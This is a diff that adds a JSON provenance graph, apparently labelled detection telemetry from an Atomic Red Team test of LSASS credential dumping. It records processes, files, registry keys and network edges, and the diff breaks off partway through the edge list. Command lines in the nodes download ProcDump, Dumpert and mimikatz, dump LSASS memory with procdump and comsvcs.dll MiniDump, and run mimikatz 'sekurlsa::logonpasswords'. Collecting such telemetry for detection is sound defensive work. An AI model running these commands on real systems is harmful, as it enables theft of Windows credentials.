@@ -1,4 +1,1105 @@
 {
-  "nodes": [],
-  "edges": []
+  "nodes": [
+    {
+      "id": "Process:{D28789B6-7C64-5FA1-0C00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "svchost",
+        "image": "%WINDIR%\\System32\\svchost.exe",
+        "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+        "parent_image": "%WINDIR%\\System32\\services.exe",
+        "guid": "{D28789B6-7C64-5FA1-0C00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7C62-5FA1-0A00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "services",
+        "image": "%WINDIR%\\System32\\services.exe",
+        "guid": "{D28789B6-7C62-5FA1-0A00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7C62-5FA1-0B00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "lsass",
+        "image": "%WINDIR%\\System32\\lsass.exe",
+        "command_line": "C:\\Windows\\system32\\lsass.exe",
+        "parent_image": "%WINDIR%\\System32\\wininit.exe",
+        "guid": "{D28789B6-7C62-5FA1-0B00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7C62-5FA1-0700-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "wininit",
+        "image": "%WINDIR%\\System32\\wininit.exe",
+        "guid": "{D28789B6-7C62-5FA1-0700-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7C62-5FA1-0400-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "smss",
+        "image": "%WINDIR%\\System32\\smss.exe",
+        "guid": "{D28789B6-7C62-5FA1-0400-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7C61-5FA1-0200-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "smss",
+        "image": "%WINDIR%\\System32\\smss.exe",
+        "guid": "{D28789B6-7C61-5FA1-0200-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Registry:99b3252a38b6b88e",
+      "type": "Registry",
+      "properties": {
+        "path": "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\nolmhash"
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CCC-5FA1-CB00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted [DECODED: &chcp.com 65001 > $null\n$exec_wrapper_str = $input | Out-String\n$split_parts = $exec_wrapper_str.Split(@(\"`0`0`0`0\"), 2, [StringSplitOptions]::RemoveEmptyEntries)\nIf (-not $split_parts.Length -eq 2) {...]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CCC-5FA1-CB00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CCC-5FA1-CA00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CCC-5FA1-CA00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CCC-5FA1-C900-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{D28789B6-7CCC-5FA1-C900-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CCC-5FA1-C700-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{D28789B6-7CCC-5FA1-C700-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CCD-5FA1-CF00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"powershell.exe\" -noninteractive [DECODED: [Console]::InputEncoding = New-Object Text.UTF8Encoding $false; Import-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force\nInvoke-AtomicTest \"T1003.001\" -GetPrereqs]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CCD-5FA1-CF00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD0-5FA1-D800-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {Invoke-WebRequest \\\"\"https://download.sysinternals.com/files/Procdump.zip\\\"\" -OutFile \\\"\"$env:TEMP\\Procdump.zip\\\"\"\nExpand-Archive $env:TEMP\\Procdump.zip $env:TEMP\\Procdump -Force\nNew-Item -ItemType Directory (Split-Path C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump.exe) -Force | Out-Null\nCopy-Item $env:TEMP\\Procdump\\Procdump.exe C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump.exe -Force} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD0-5FA1-D800-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:d6679cc6a0a0471c",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://download.sysinternals.com/files/Procdump.zip\\"
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD0-5FA1-D700-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {if (Test-Path C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump.exe) {exit 0} else {exit 1}} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD0-5FA1-D700-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:2abecf8fd969c735",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\Procdump\\procdump64a.exe",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\procdump\\procdump64a.exe"
+      }
+    },
+    {
+      "id": "File:e5b7ffd443d347fc",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\Procdump\\procdump64.exe",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\procdump\\procdump64.exe"
+      }
+    },
+    {
+      "id": "File:a0c5a52237e37ce0",
+      "type": "File",
+      "properties": {
+        "path": "%USER%%TEMP%\\Procdump\\procdump.exe",
+        "path_normalized": "c:\\users\\[user]\\appdata\\local\\temp\\procdump\\procdump.exe"
+      }
+    },
+    {
+      "id": "Network:07476dc5e129e729",
+      "type": "Network",
+      "properties": {
+        "address": "152.199.19.160",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD2-5FA1-DB00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {New-Item -ItemType Directory (Split-Path C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\Outflank-Dumpert.exe) -Force | Out-Null\nInvoke-WebRequest \\\"\"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\\\"\" -OutFile C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\Outflank-Dumpert.exe} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD2-5FA1-DB00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:87ef99e863e763f4",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\\"
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD2-5FA1-DA00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {if (Test-Path C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\Outflank-Dumpert.exe) {exit 0} else {exit 1}} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD2-5FA1-DA00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:667e6d2fa739f204",
+      "type": "File",
+      "properties": {
+        "path": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump.exe",
+        "path_normalized": "c:\\atomicredteam\\atomics\\t1003.001\\bin\\procdump.exe"
+      }
+    },
+    {
+      "id": "File:c2b507e380917dbf",
+      "type": "File",
+      "properties": {
+        "path": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\Outflank-Dumpert.exe",
+        "path_normalized": "c:\\atomicredteam\\atomics\\t1003.001\\bin\\outflank-dumpert.exe"
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD4-5FA1-DE00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \\\"\"https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip\\\"\" -OutFile \\\"\"$env:TEMP\\Mimi.zip\\\"\"\nExpand-Archive $env:TEMP\\Mimi.zip $env:TEMP\\Mimi -Force\nNew-Item -ItemType Directory (Split-Path C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\mimikatz.exe) -Force | Out-Null\nCopy-Item $env:TEMP\\Mimi\\x64\\mimikatz.exe C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\mimikatz.exe -Force} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD4-5FA1-DE00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:1c4ac4f38f9f7265",
+      "type": "Network",
+      "properties": {
+        "type": "URL",
+        "address": "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip\\"
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD4-5FA1-DD00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {if (Test-Path C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\mimikatz.exe) {exit 0} else {exit 1}} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD4-5FA1-DD00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD5-5FA1-E100-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"if not exist %%tmp%%\\lsass.DMP (exit /b 1)\"",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD5-5FA1-E100-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD5-5FA1-E000-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD5-5FA1-E000-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Network:98679ae57d44eb47",
+      "type": "Network",
+      "properties": {
+        "address": "140.82.121.3",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Network:b1e556680ab801e5",
+      "type": "Network",
+      "properties": {
+        "address": "151.101.12.133",
+        "port": "443",
+        "protocol": "tcp"
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD8-5FA1-F200-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD8-5FA1-F200-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD8-5FA1-F000-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{D28789B6-7CD8-5FA1-F000-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD8-5FA1-EE00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{D28789B6-7CD8-5FA1-EE00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD9-5FA1-FC00-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"powershell.exe\" -noninteractive [DECODED: [Console]::InputEncoding = New-Object Text.UTF8Encoding $false; Import-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force\nInvoke-AtomicTest \"T1003.001\" -Confirm:$false -Ti...]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD9-5FA1-FC00-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CD8-5FA1-F500-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CD8-5FA1-F500-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Registry:3f28a0128d9a65a8",
+      "type": "Registry",
+      "properties": {
+        "path": "HKLM\\System\\CurrentControlSet\\Services\\WCESERVICE\\ImagePath"
+      }
+    },
+    {
+      "id": "Registry:3cf31c8b41e2a26a",
+      "type": "Registry",
+      "properties": {
+        "path": "HKLM\\System\\CurrentControlSet\\Services\\WCESERVICE\\Start"
+      }
+    },
+    {
+      "id": "Registry:ae74111d403bab25",
+      "type": "Registry",
+      "properties": {
+        "path": "HKU\\S-1-5-21-635769498-3620204953-2298246598-500\\SOFTWARE\\Sysinternals\\ProcDump\\EulaAccepted"
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CDB-5FA1-1D01-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "procdump64",
+        "image": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump64.exe",
+        "command_line": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump.exe  -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp ",
+        "parent_image": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump.exe",
+        "guid": "{D28789B6-7CDB-5FA1-1D01-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CDB-5FA1-1A01-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "procdump",
+        "image": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump.exe",
+        "guid": "{D28789B6-7CDB-5FA1-1A01-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:60dd53c986a25fad",
+      "type": "File",
+      "properties": {
+        "path": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump64.exe",
+        "path_normalized": "c:\\atomicredteam\\atomics\\t1003.001\\bin\\procdump64.exe"
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CDB-5FA1-1801-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{D28789B6-7CDB-5FA1-1801-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CDE-5FA1-2101-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CDE-5FA1-2101-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CDF-5FA1-2801-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\mimikatz.exe \"sekurlsa::minidump %%tmp%%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit\" ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CDF-5FA1-2801-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CDF-5FA1-2701-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "Outflank-Dumpert",
+        "image": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\Outflank-Dumpert.exe",
+        "command_line": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\Outflank-Dumpert.exe  ",
+        "parent_image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{D28789B6-7CDF-5FA1-2701-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CDF-5FA1-2601-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{D28789B6-7CDF-5FA1-2601-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CDF-5FA1-2501-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "rundll32",
+        "image": "%WINDIR%\\System32\\rundll32.exe",
+        "command_line": "\"C:\\Windows\\System32\\rundll32.exe\" C:\\windows\\System32\\comsvcs.dll MiniDump 868 C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\lsass-comsvcs.dmp full",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CDF-5FA1-2501-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CE0-5FA1-3201-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CE0-5FA1-3201-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CE0-5FA1-3101-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{D28789B6-7CE0-5FA1-3101-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CE0-5FA1-2F01-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "winrshost",
+        "image": "%WINDIR%\\System32\\winrshost.exe",
+        "guid": "{D28789B6-7CE0-5FA1-2F01-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CE1-5FA1-4001-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"powershell.exe\" -noninteractive [DECODED: [Console]::InputEncoding = New-Object Text.UTF8Encoding $false; Import-Module \"C:\\AtomicRedTeam\\invoke-atomicredteam\\Invoke-AtomicRedTeam.psd1\" -Force\nInvoke-AtomicTest \"T1003.001\" -Cleanup]",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CE1-5FA1-4001-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CE0-5FA1-3501-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CE0-5FA1-3501-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CE2-5FA1-5201-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" & {Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore} ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CE2-5FA1-5201-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{D28789B6-7CE2-5FA1-5001-000000008801}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "command_line": "\"C:\\Windows\\system32\\cmd.exe\" /c \"del \"C:\\Windows\\Temp\\lsass_dump.dmp\" >nul 2> nul\" ",
+        "parent_image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{D28789B6-7CE2-5FA1-5001-000000008801}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Registry:80e3c3ba984a7193",
+      "type": "Registry",
+      "properties": {
+        "path": "HKLM\\System\\CurrentControlSet\\Services\\npf\\ImagePath"
+      }
+    },
+    {
+      "id": "Registry:e77c86c0aea284c5",
+      "type": "Registry",
+      "properties": {
+        "path": "HKLM\\System\\CurrentControlSet\\Services\\npf\\Start"
+      }
+    },
+    {
+      "id": "Process:{29E67E80-859E-6019-7005-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "powershell",
+        "image": "%WINDIR%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "guid": "{29E67E80-859E-6019-7005-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Registry:82f77e03b92b1422",
+      "type": "Registry",
+      "properties": {
+        "path": "HKU\\S-1-5-21-1645871015-3279536928-3104981001-500\\SOFTWARE\\Sysinternals\\ProcDump\\EulaAccepted"
+      }
+    },
+    {
+      "id": "Process:{29E67E80-D475-601A-4830-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "procdump",
+        "image": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\procdump.exe",
+        "guid": "{29E67E80-D475-601A-4830-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{29E67E80-D475-601A-4730-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "cmd",
+        "image": "%WINDIR%\\System32\\cmd.exe",
+        "guid": "{29E67E80-D475-601A-4730-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{29E67E80-D482-601A-4E30-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "notprocdump64",
+        "image": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\notprocdump64.exe",
+        "command_line": "\"C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\notprocdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",
+        "parent_image": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\notprocdump.exe",
+        "guid": "{29E67E80-D482-601A-4E30-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "Process:{29E67E80-D482-601A-4D30-00000000A301}",
+      "type": "Process",
+      "properties": {
+        "label": "notprocdump",
+        "image": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\notprocdump.exe",
+        "guid": "{29E67E80-D482-601A-4D30-00000000A301}",
+        "malicious": true
+      }
+    },
+    {
+      "id": "File:fea588adb655ae6d",
+      "type": "File",
+      "properties": {
+        "path": "C:\\AtomicRedTeam\\atomics\\T1003.001\\bin\\notprocdump64.exe",
+        "path_normalized": "c:\\atomicredteam\\atomics\\t1003.001\\bin\\notprocdump64.exe"
+      }
+    }
+  ],
+  "edges": [
+    {
+      "source": "Process:{D28789B6-7C62-5FA1-0A00-000000008801}",
+      "target": "Process:{D28789B6-7C64-5FA1-0C00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:51:15.925846500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7C62-5FA1-0700-000000008801}",
+      "target": "Process:{D28789B6-7C62-5FA1-0B00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:51:15.921727400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7C62-5FA1-0700-000000008801}",
+      "target": "Process:{D28789B6-7C62-5FA1-0A00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:51:15.920209300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7C62-5FA1-0400-000000008801}",
+      "target": "Process:{D28789B6-7C62-5FA1-0700-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:51:15.907727600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7C61-5FA1-0200-000000008801}",
+      "target": "Process:{D28789B6-7C62-5FA1-0400-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:51:15.890147600Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7C62-5FA1-0A00-000000008801}",
+      "target": "Registry:99b3252a38b6b88e",
+      "relation": "MODIFIED_REGISTRY",
+      "timestamp": "2020-11-03T15:51:44.094372400Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CCC-5FA1-CA00-000000008801}",
+      "target": "Process:{D28789B6-7CCC-5FA1-CB00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:44.382676700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CCC-5FA1-C900-000000008801}",
+      "target": "Process:{D28789B6-7CCC-5FA1-CA00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:44.253297700Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CCC-5FA1-C700-000000008801}",
+      "target": "Process:{D28789B6-7CCC-5FA1-C900-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:44.248023500Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7C64-5FA1-0C00-000000008801}",
+      "target": "Process:{D28789B6-7CCC-5FA1-C700-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:44.211983300Z",
+      "access_count": 3,
+      "last_timestamp": "2020-11-03T15:53:04.461452700Z"
+    },
+    {
+      "source": "Process:{D28789B6-7CCC-5FA1-CB00-000000008801}",
+      "target": "Process:{D28789B6-7CCD-5FA1-CF00-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:45.356560000Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CCD-5FA1-CF00-000000008801}",
+      "target": "Process:{D28789B6-7CD0-5FA1-D800-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:48.425892300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CD0-5FA1-D800-000000008801}",
+      "target": "Network:d6679cc6a0a0471c",
+      "relation": "CONNECTED_TO",
+      "timestamp": "2020-11-03T15:52:48.425892300Z",
+      "access_count": 1
+    },
+    {
+      "source": "Process:{D28789B6-7CCD-5FA1-CF00-000000008801}",
+      "target": "Process:{D28789B6-7CD0-5FA1-D700-000000008801}",
+      "relation": "CREATED",
+      "timestamp": "2020-11-03T15:52:48.219577100Z",
+      "access_count": 2,
